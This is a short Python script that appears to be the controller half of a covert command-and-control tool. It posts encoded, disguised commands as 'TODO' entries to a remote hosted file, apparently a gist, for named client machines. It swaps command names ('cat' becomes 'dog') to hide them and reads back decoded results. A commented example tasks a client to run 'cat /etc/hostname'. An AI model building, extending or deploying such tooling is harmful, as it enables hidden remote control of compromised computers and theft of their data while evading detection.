from json import dumps
from os import listdir
from os.path import join
from urllib.request import urlopen, Request

from constants import gid, gat
from encoding import decode, encode
from myhttp import get_file, update_file

opmap = {
    'w': 'a',
    'cat': 'dog'
}

def add_todo(name: str, id: str, task: str, operation: str, args: str = ""):
    old = get_file('TODOs')
    argstr = '' if len(args) == 0 else f' {args}'
    new = f'{old}\n- {id} {name}:' + encode(f' {task}', f'{opmap[operation]}{argstr}')
    if update_file('TODOs', new):
        print(f'Added operation "{operation}" for client "{name}"')
    else:
        print("Failed to add operation!")

def print_result(cmd: str, id: str):
    res = get_file(f'{cmd}-{id}')
    (head, title, ct) = res.split(f'\n\n')
    print(decode(head))
    print('---')
    print(decode(ct))
    print('---')

if __name__ == '__main__':
    #add_todo('Marin', '123', 'add bash manpage', 'cat', '/etc/hostname')
    #print_result('bash', '123')
    pass
